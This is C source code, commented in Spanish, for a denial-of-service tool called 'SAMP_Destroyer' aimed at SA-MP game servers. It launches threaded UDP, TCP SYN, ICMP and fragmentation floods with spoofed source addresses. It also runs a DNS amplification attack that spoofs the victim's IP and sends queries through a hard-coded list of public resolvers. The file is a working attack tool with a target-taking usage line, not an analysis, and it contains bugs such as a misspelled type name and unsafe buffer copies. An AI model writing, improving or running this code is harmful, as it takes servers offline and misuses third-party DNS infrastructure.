#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <signal.h>
#include <sys/resource.h>
#include <errno.h>

#define MAX_PACKET_SIZE 4096
#define THREAD_COUNT 1000
#define DNS_AMPLIFICATION_FACTOR 50

volatile int stop_flag = 0;
volatile long packet_count = 0;
pthread_mutex_t count_mutex = PTHREAD_MUTEX_INITIALIZER;

// Estructura para el encabezado IP personalizado
struct custom_ip_header {
    unsigned char version_ihl;
    unsigned char tos;
    unsigned short total_length;
    unsigned short identification;
    unsigned short flags_fragment;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short checksum;
    unsigned int source_ip;
    unsigned int dest_ip;
};

// Estructura para el encabezado UDP personalizado
struct custom_udp_header {
    unsigned short source_port;
    unsigned short dest_port;
    unsigned short length;
    unsigned short checksum;
};

// Estructura para el encabezado TCP personalizado
struct custom_tcp_header {
    unsigned short source_port;
    unsigned short dest_port;
    unsigned int sequence;
    unsigned int acknowledgment;
    unsigned char data_offset;
    unsigned char flags;
    unsigned short window;
    unsigned short checksum;
    unsigned short urgent_pointer;
};

// Estructura para el encabezado ICMP personalizado
struct custom_icmp_header {
    unsigned char type;
    unsigned char code;
    unsigned short checksum;
    unsigned short id;
    unsigned short sequence;
};

// Función para calcular checksum IP
unsigned short calculate_ip_checksum(unsigned short *addr, int count) {
    register long sum = 0;
    
    while (count > 1) {
        sum += *addr++;
        count -= 2;
    }
    
    if (count > 0) {
        sum += *(unsigned char *)addr;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    
    return ~sum;
}

// Función para calcular checksum TCP/UDP
unsigned short calculate_transport_checksum(unsigned short *addr, int len, unsigned int src_ip, unsigned int dest_ip, unsigned char protocol) {
    unsigned long sum = 0;
    
    // Pseudo-header
    sum += (src_ip >> 16) & 0xFFFF;
    sum += src_ip & 0xFFFF;
    sum += (dest_ip >> 16) & 0xFFFF;
    sum += dest_ip & 0xFFFF;
    sum += htons(protocol);
    sum += htons(len);
    
    // Data
    while (len > 1) {
        sum += *addr++;
        len -= 2;
    }
    
    if (len > 0) {
        sum += *(unsigned char *)addr;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    
    return ~sum;
}

// Función de ataque UDP con payloads especializados para SA-MP
void* udp_samp_attack(void* args) {
    char** target_info = (char**)args;
    char* target_ip = target_info[0];
    int target_port = atoi(target_info[1]);
    int duration = atoi(target_info[2]);
    int thread_id = atoi(target_info[3]);
    
    struct sockaddr_in target_addr;
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct custom_ip_header *ip_hdr = (struct custom_ip_header *)packet;
    struct custom_udp_header *udp_hdr = (struct custom_udp_header *)(packet + sizeof(struct custom_ip_header));
    char *data = packet + sizeof(struct custom_ip_header) + sizeof(struct custom_udp_header);
    int data_size = MAX_PACKET_SIZE - sizeof(struct custom_ip_header) - sizeof(struct custom_udp_header);
    
    // Configurar dirección del objetivo
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    // Crear socket raw
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    
    // Configurar encabezado IP
    ip_hdr->version_ihl = 0x45;
    ip_hdr->tos = 0;
    ip_hdr->total_length = htons(sizeof(struct custom_ip_header) + sizeof(struct custom_udp_header) + data_size);
    ip_hdr->identification = htons(rand());
    ip_hdr->flags_fragment = 0;
    ip_hdr->ttl = 255;
    ip_hdr->protocol = IPPROTO_UDP;
    ip_hdr->dest_ip = target_addr.sin_addr.s_addr;
    
    // Configurar encabezado UDP
    udp_hdr->dest_port = htons(target_port);
    udp_hdr->length = htons(sizeof(struct custom_udp_header) + data_size);
    
    // Preparar payloads específicos para SA-MP
    char samp_payloads[10][1024];
    
    // Payload 1: Paquete de conexión SA-MP válido
    memcpy(samp_payloads[0], "SAMP", 4);
    memcpy(samp_payloads[0] + 4, &target_addr.sin_addr.s_addr, 4);
    memcpy(samp_payloads[0] + 8, &target_port, 2);
    samp_payloads[0][10] = 'p'; // Paquete de ping
    
    // Payload 2: Paquete de información SA-MP
    memcpy(samp_payloads[1], "SAMP", 4);
    memcpy(samp_payloads[1] + 4, &target_addr.sin_addr.s_addr, 4);
    memcpy(samp_payloads[1] + 8, &target_port, 2);
    samp_payloads[1][10] = 'i'; // Paquete de información
    
    // Payload 3: Paquete de reglas SA-MP
    memcpy(samp_payloads[2], "SAMP", 4);
    memcpy(samp_payloads[2] + 4, &target_addr.sin_addr.s_addr, 4);
    memcpy(samp_payloads[2] + 8, &target_port, 2);
    samp_payloads[2][10] = 'r'; // Paquete de reglas
    
    // Payload 4: Paquete de jugadores SA-MP
    memcpy(samp_payloads[3], "SAMP", 4);
    memcpy(samp_payloads[3] + 4, &target_addr.sin_addr.s_addr, 4);
    memcpy(samp_payloads[3] + 8, &target_port, 2);
    samp_payloads[3][10] = 'd'; // Paquete de jugadores
    
    // Payload 5-9: Payloads destructivos
    memset(samp_payloads[4], 0xFF, 1024);
    memset(samp_payloads[5], 0x00, 1024);
    memset(samp_payloads[6], 'A', 1024);
    memset(samp_payloads[7], 'B', 1024);
    memset(samp_payloads[8], 'C', 1024);
    
    // Payload 9: Payload aleatorio
    for (int i = 0; i < 1024; i++) {
        samp_payloads[9][i] = rand() % 256;
    }
    
    time_t end_time = time(NULL) + duration;
    
    while (!stop_flag && time(NULL) < end_time) {
        // IP de origen aleatoria
        ip_hdr->source_ip = rand();
        
        // Puerto de origen aleatorio
        udp_hdr->source_port = htons(rand() % 65535);
        
        // Elegir payload aleatorio
        int payload_index = rand() % 10;
        memcpy(data, samp_payloads[payload_index], data_size);
        
        // Calcular checksum UDP
        udp_hdr->checksum = 0;
        udp_hdr->checksum = calculate_transport_checksum(
            (unsigned short *)udp_hdr, 
            sizeof(struct custom_udp_header) + data_size,
            ip_hdr->source_ip, 
            ip_hdr->dest_ip, 
            IPPROTO_UDP
        );
        
        // Calcular checksum IP
        ip_hdr->checksum = 0;
        ip_hdr->checksum = calculate_ip_checksum((unsigned short *)ip_hdr, sizeof(struct custom_ip_header));
        
        // Enviar paquete
        if (sendto(sock, packet, sizeof(struct custom_ip_header) + sizeof(struct custom_udp_header) + data_size, 
                  0, (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
            pthread_mutex_lock(&count_mutex);
            packet_count++;
            pthread_mutex_unlock(&count_mutex);
        }
        
        // Sin retraso para máxima velocidad
    }
    
    close(sock);
    printf("Hilo UDP SA-MP %d completado. Paquetes enviados: %ld\n", thread_id, packet_count);
    pthread_exit(NULL);
}

// Función de ataque TCP SYN Flood masivo
void* tcp_syn_attack(void* args) {
    char** target_info = (char**)args;
    char* target_ip = target_info[0];
    int target_port = atoi(target_info[1]);
    int duration = atoi(target_info[2]);
    int thread_id = atoi(target_info[3]);
    
    struct sockaddr_in target_addr;
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct custom_ip_header *ip_hdr = (struct custom_ip_header *)packet;
    struct custom_tcp_header *tcp_hdr = (struct custom_tcp_header *)(packet + sizeof(struct custom_ip_header));
    
    // Configurar dirección del objetivo
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    // Crear socket raw
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("TCP socket creation failed");
        pthread_exit(NULL);
    }
    
    // Configurar encabezado IP
    ip_hdr->version_ihl = 0x45;
    ip_hdr->tos = 0;
    ip_hdr->total_length = htons(sizeof(struct custom_ip_header) + sizeof(struct custom_tcp_header));
    ip_hdr->identification = htons(rand());
    ip_hdr->flags_fragment = 0;
    ip_hdr->ttl = 255;
    ip_hdr->protocol = IPPROTO_TCP;
    ip_hdr->dest_ip = target_addr.sin_addr.s_addr;
    
    // Configurar encabezado TCP
    tcp_hdr->dest_port = htons(target_port);
    tcp_hdr->sequence = htonl(rand());
    tcp_hdr->acknowledgment = 0;
    tcp_hdr->data_offset = 5;
    tcp_hdr->flags = 0x02;  // SYN flag
    tcp_hdr->window = htons(65535);
    tcp_hdr->urgent_pointer = 0;
    
    time_t end_time = time(NULL) + duration;
    
    while (!stop_flag && time(NULL) < end_time) {
        // IP de origen aleatoria
        ip_hdr->source_ip = rand();
        
        // Puerto de origen aleatorio
        tcp_hdr->source_port = htons(rand() % 65535);
        
        // Calcular checksum TCP
        tcp_hdr->checksum = 0;
        tcp_hdr->checksum = calculate_transport_checksum(
            (unsigned short *)tcp_hdr, 
            sizeof(struct custom_tcp_header),
            ip_hdr->source_ip, 
            ip_hdr->dest_ip, 
            IPPROTO_TCP
        );
        
        // Calcular checksum IP
        ip_hdr->checksum = 0;
        ip_hdr->checksum = calculate_ip_checksum((unsigned short *)ip_hdr, sizeof(struct custom_ip_header));
        
        // Enviar paquete
        if (sendto(sock, packet, sizeof(struct custom_ip_header) + sizeof(struct custom_tcp_header), 
                  0, (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
            pthread_mutex_lock(&count_mutex);
            packet_count++;
            pthread_mutex_unlock(&count_mutex);
        }
    }
    
    close(sock);
    printf("Hilo TCP SYN %d completado. Paquetes enviados: %ld\n", thread_id, packet_count);
    pthread_exit(NULL);
}

// Función de ataque ICMP Flood amplificado
void* icmp_amplification_attack(void* args) {
    char** target_info = (char**)args;
    char* target_ip = target_info[0];
    int duration = atoi(target_info[2]);
    int thread_id = atoi(target_info[3]);
    
    struct sockaddr_in target_addr;
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct custom_ip_header *ip_hdr = (struct custom_ip_header *)packet;
    struct custom_icmp_header *icmp_hdr = (struct custom_icmp_header *)(packet + sizeof(struct custom_ip_header));
    char *data = packet + sizeof(struct custom_ip_header) + sizeof(struct custom_icmp_header);
    int data_size = MAX_PACKET_SIZE - sizeof(struct custom_ip_header) - sizeof(struct custom_icmp_header);
    
    // Configurar dirección del objetivo
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    // Crear socket raw
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("ICMP socket creation failed");
        pthread_exit(NULL);
    }
    
    // Configurar encabezado IP
    ip_hdr->version_ihl = 0x45;
    ip_hdr->tos = 0;
    ip_hdr->total_length = htons(sizeof(struct custom_ip_header) + sizeof(struct custom_icmp_header) + data_size);
    ip_hdr->identification = htons(rand());
    ip_hdr->flags_fragment = 0;
    ip_hdr->ttl = 255;
    ip_hdr->protocol = IPPROTO_ICMP;
    ip_hdr->dest_ip = target_addr.sin_addr.s_addr;
    
    // Configurar encabezado ICMP
    icmp_hdr->type = 8;  // Echo Request
    icmp_hdr->code = 0;
    icmp_hdr->id = htons(rand());
    icmp_hdr->sequence = 0;
    
    // Preparar datos
    memset(data, 'A', data_size);
    
    time_t end_time = time(NULL) + duration;
    
    while (!stop_flag && time(NULL) < end_time) {
        // IP de origen aleatoria
        ip_hdr->source_ip = rand();
        
        // Incrementar número de secuencia
        icmp_hdr->sequence++;
        
        // Calcular checksum ICMP
        icmp_hdr->checksum = 0;
        icmp_hdr->checksum = calculate_ip_checksum((unsigned short *)icmp_hdr, sizeof(struct custom_icmp_header) + data_size);
        
        // Calcular checksum IP
        ip_hdr->checksum = 0;
        ip_hdr->checksum = calculate_ip_checksum((unsigned short *)ip_hdr, sizeof(struct custom_ip_header));
        
        // Enviar paquete
        if (sendto(sock, packet, sizeof(struct custom_ip_header) + sizeof(struct custom_icmp_header) + data_size, 
                  0, (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
            pthread_mutex_lock(&count_mutex);
            packet_count++;
            pthread_mutex_unlock(&count_mutex);
        }
    }
    
    close(sock);
    printf("Hilo ICMP %d completado. Paquetes enviados: %ld\n", thread_id, packet_count);
    pthread_exit(NULL);
}

// Función de ataque de fragmentación de paquetes
void* fragmentation_attack(void* args) {
    char** target_info = (char**)args;
    char* target_ip = target_info[0];
    int target_port = atoi(target_info[1]);
    int duration = atoi(target_info[2]);
    int thread_id = atoi(target_info[3]);
    
    struct sockaddr_in target_addr;
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct custom_ip_header *ip_hdr = (struct custom_ip_header *)packet;
    struct custom_udp_header *udp_hdr = (struct custom_udp_header *)(packet + sizeof(struct custom_ip_header));
    char *data = packet + sizeof(struct custom_ip_header) + sizeof(struct custom_udp_header);
    int data_size = MAX_PACKET_SIZE - sizeof(struct custom_ip_header) - sizeof(struct_custom_udp_header);
    
    // Configurar dirección del objetivo
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    // Crear socket raw
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("Fragmentation socket creation failed");
        pthread_exit(NULL);
    }
    
    // Configurar encabezado IP con flags de fragmentación
    ip_hdr->version_ihl = 0x45;
    ip_hdr->tos = 0;
    ip_hdr->total_length = htons(sizeof(struct custom_ip_header) + sizeof(struct custom_udp_header) + data_size);
    ip_hdr->identification = htons(rand());
    ip_hdr->flags_fragment = 0x1F;  // Flags de fragmentación activados
    ip_hdr->ttl = 255;
    ip_hdr->protocol = IPPROTO_UDP;
    ip_hdr->dest_ip = target_addr.sin_addr.s_addr;
    
    // Configurar encabezado UDP
    udp_hdr->dest_port = htons(target_port);
    udp_hdr->length = htons(sizeof(struct custom_udp_header) + data_size);
    
    // Preparar payload destructivo
    memset(data, 'X', data_size);
    
    time_t end_time = time(NULL) + duration;
    
    while (!stop_flag && time(NULL) < end_time) {
        // IP de origen aleatoria
        ip_hdr->source_ip = rand();
        
        // Puerto de origen aleatorio
        udp_hdr->source_port = htons(rand() % 65535);
        
        // Calcular checksum UDP
        udp_hdr->checksum = 0;
        udp_hdr->checksum = calculate_transport_checksum(
            (unsigned short *)udp_hdr, 
            sizeof(struct custom_udp_header) + data_size,
            ip_hdr->source_ip, 
            ip_hdr->dest_ip, 
            IPPROTO_UDP
        );
        
        // Calcular checksum IP
        ip_hdr->checksum = 0;
        ip_hdr->checksum = calculate_ip_checksum((unsigned short *)ip_hdr, sizeof(struct custom_ip_header));
        
        // Enviar paquete fragmentado
        if (sendto(sock, packet, sizeof(struct custom_ip_header) + sizeof(struct custom_udp_header) + data_size, 
                  0, (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
            pthread_mutex_lock(&count_mutex);
            packet_count++;
            pthread_mutex_unlock(&count_mutex);
        }
    }
    
    close(sock);
    printf("Hilo de fragmentación %d completado. Paquetes enviados: %ld\n", thread_id, packet_count);
    pthread_exit(NULL);
}

// Función de ataque de amplificación DNS
void* dns_amplification_attack(void* args) {
    char** target_info = (char**)args;
    char* target_ip = target_info[0];
    int duration = atoi(target_info[2]);
    int thread_id = atoi(target_info[3]);
    
    struct sockaddr_in target_addr;
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct custom_ip_header *ip_hdr = (struct custom_ip_header *)packet;
    struct custom_udp_header *udp_hdr = (struct custom_udp_header *)(packet + sizeof(struct custom_ip_header));
    char *data = packet + sizeof(struct custom_ip_header) + sizeof(struct custom_udp_header);
    
    // Lista de servidores DNS públicos para amplificación
    char* dns_servers[] = {
        "8.8.8.8",
        "8.8.4.4",
        "1.1.1.1",
        "1.0.0.1",
        "9.9.9.9",
        "208.67.222.222",
        "208.67.220.220",
        "8.26.56.26",
        "8.20.247.20",
        "64.6.64.6"
    };
    int dns_count = sizeof(dns_servers) / sizeof(dns_servers[0]);
    
    // Crear socket raw
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("DNS amplification socket creation failed");
        pthread_exit(NULL);
    }
    
    // Configurar encabezado IP
    ip_hdr->version_ihl = 0x45;
    ip_hdr->tos = 0;
    ip_hdr->total_length = htons(sizeof(struct custom_ip_header) + sizeof(struct custom_udp_header) + 512);
    ip_hdr->identification = htons(rand());
    ip_hdr->flags_fragment = 0;
    ip_hdr->ttl = 255;
    ip_hdr->protocol = IPPROTO_UDP;
    
    // Configurar encabezado UDP
    udp_hdr->source_port = htons(53);
    udp_hdr->length = htons(sizeof(struct custom_udp_header) + 512);
    
    // Preparar payload de consulta DNS ANY
    memset(data, 0, 512);
    data[0] = rand() % 256;  // ID de transacción aleatorio
    data[1] = rand() % 256;
    data[2] = 0x01;  // Flags: consulta recursiva
    data[3] = 0x00;
    data[4] = 0x00;  // Número de preguntas: 1
    data[5] = 0x01;
    data[6] = 0x00;  // Número de respuestas: 0
    data[7] = 0x00;
    data[8] = 0x00;  // Número de registros autoritativos: 0
    data[9] = 0x00;
    data[10] = 0x00;  // Número de registros adicionales: 0
    data[11] = 0x00;
    
    // Consulta DNS para example.com
    char query[] = "\x07example\x03com\x00";
    memcpy(data + 12, query, strlen(query));
    data[12 + strlen(query)] = 0x00;  // Tipo: ANY
    data[13 + strlen(query)] = 0xFF;
    data[14 + strlen(query)] = 0x00;  // Clase: IN
    data[15 + strlen(query)] = 0x01;
    
    time_t end_time = time(NULL) + duration;
    
    while (!stop_flag && time(NULL) < end_time) {
        // Elegir servidor DNS aleatorio
        char* dns_server = dns_servers[rand() % dns_count];
        struct sockaddr_in dns_addr;
        memset(&dns_addr, 0, sizeof(dns_addr));
        dns_addr.sin_family = AF_INET;
        dns_addr.sin_port = htons(53);
        inet_pton(AF_INET, dns_server, &dns_addr.sin_addr);
        
        // IP de origen spoofeada (IP del objetivo)
        inet_pton(AF_INET, target_ip, &ip_hdr->source_ip);
        ip_hdr->dest_ip = dns_addr.sin_addr.s_addr;
        
        // Puerto de destino
        udp_hdr->dest_port = htons(53);
        
        // Calcular checksum UDP
        udp_hdr->checksum = 0;
        udp_hdr->checksum = calculate_transport_checksum(
            (unsigned short *)udp_hdr, 
            sizeof(struct custom_udp_header) + 512,
            ip_hdr->source_ip, 
            ip_hdr->dest_ip, 
            IPPROTO_UDP
        );
        
        // Calcular checksum IP
        ip_hdr->checksum = 0;
        ip_hdr->checksum = calculate_ip_checksum((unsigned short *)ip_hdr, sizeof(struct custom_ip_header));
        
        // Enviar paquete
        if (sendto(sock, packet, sizeof(struct custom_ip_header) + sizeof(struct custom_udp_header) + 512, 
                  0, (struct sockaddr*)&dns_addr, sizeof(dns_addr)) > 0) {
            pthread_mutex_lock(&count_mutex);
            packet_count++;
            pthread_mutex_unlock(&count_mutex);
        }
    }
    
    close(sock);
    printf("Hilo de amplificación DNS %d completado. Paquetes enviados: %ld\n", thread_id, packet_count);
    pthread_exit(NULL);
}

// Manejador de señal para detener el ataque
void signal_handler(int sig) {
    stop_flag = 1;
    printf("\nDeteniendo ataque...\n");
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Uso: ./SAMP_Destroyer <IP> <PUERTO> <DURACION>\n");
        printf("Ejemplo: ./SAMP_Destroyer 192.168.1.1 7777 60\n");
        exit(1);
    }
    
    // Aumentar límites de recursos
    struct rlimit rl;
    rl.rlim_cur = RLIM_INFINITY;
    rl.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_NOFILE, &rl);
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    printf("Iniciando ataque supremo contra %s:%d durante %d segundos\n", target_ip, target_port, duration);
    printf("Presiona Ctrl+C para detener el ataque\n");
    
    // Configurar manejador de señal
    signal(SIGINT, signal_handler);
    
    // Inicializar mutex
    pthread_mutex_init(&count_mutex, NULL);
    
    // Crear hilos de ataque
    pthread_t threads[THREAD_COUNT];
    
    // Distribuir hilos entre diferentes tipos de ataque
    int udp_threads = THREAD_COUNT / 3;
    int tcp_threads = THREAD_COUNT / 3;
    int icmp_threads = THREAD_COUNT / 6;
    int frag_threads = THREAD_COUNT / 12;
    int dns_threads = THREAD_COUNT / 12;
    
    // Crear hilos de ataque UDP SA-MP
    for (int i = 0; i < udp_threads; i++) {
        char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
        sprintf(args[3], "%d", i);
        pthread_create(&threads[i], NULL, udp_samp_attack, args);
    }
    
    // Crear hilos de ataque TCP SYN
    for (int i = udp_threads; i < udp_threads + tcp_threads; i++) {
        char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
        sprintf(args[3], "%d", i);
        pthread_create(&threads[i], NULL, tcp_syn_attack, args);
    }
    
    // Crear hilos de ataque ICMP
    for (int i = udp_threads + tcp_threads; i < udp_threads + tcp_threads + icmp_threads; i++) {
        char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
        sprintf(args[3], "%d", i);
        pthread_create(&threads[i], NULL, icmp_amplification_attack, args);
    }
    
    // Crear hilos de ataque de fragmentación
    for (int i = udp_threads + tcp_threads + icmp_threads; i < udp_threads + tcp_threads + icmp_threads + frag_threads; i++) {
        char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
        sprintf(args[3], "%d", i);
        pthread_create(&threads[i], NULL, fragmentation_attack, args);
    }
    
    // Crear hilos de ataque de amplificación DNS
    for (int i = udp_threads + tcp_threads + icmp_threads + frag_threads; i < THREAD_COUNT; i++) {
        char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
        sprintf(args[3], "%d", i);
        pthread_create(&threads[i], NULL, dns_amplification_attack, args);
    }
    
    // Mostrar estadísticas en tiempo real
    time_t start_time = time(NULL);
    time_t last_update = start_time;
    long last_packet_count = 0;
    
    while (!stop_flag && time(NULL) - start_time < duration) {
        sleep(1);
        
        time_t current_time = time(NULL);
        if (current_time - last_update >= 5) {
            long current_packet_count;
            pthread_mutex_lock(&count_mutex);
            current_packet_count = packet_count;
            pthread_mutex_unlock(&count_mutex);
            
            long packets_per_second = (current_packet_count - last_packet_count) / (current_time - last_update);
            printf("Estado: %ld paquetes enviados, %ld paquetes/segundo\n", 
                   current_packet_count, packets_per_second);
            
            last_update = current_time;
            last_packet_count = current_packet_count;
        }
    }
    
    // Esperar a que todos los hilos terminen
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Destruir mutex
    pthread_mutex_destroy(&count_mutex);
    
    printf("Ataque completado. Total de paquetes enviados: %ld\n", packet_count);
    
    return 0;
}
        
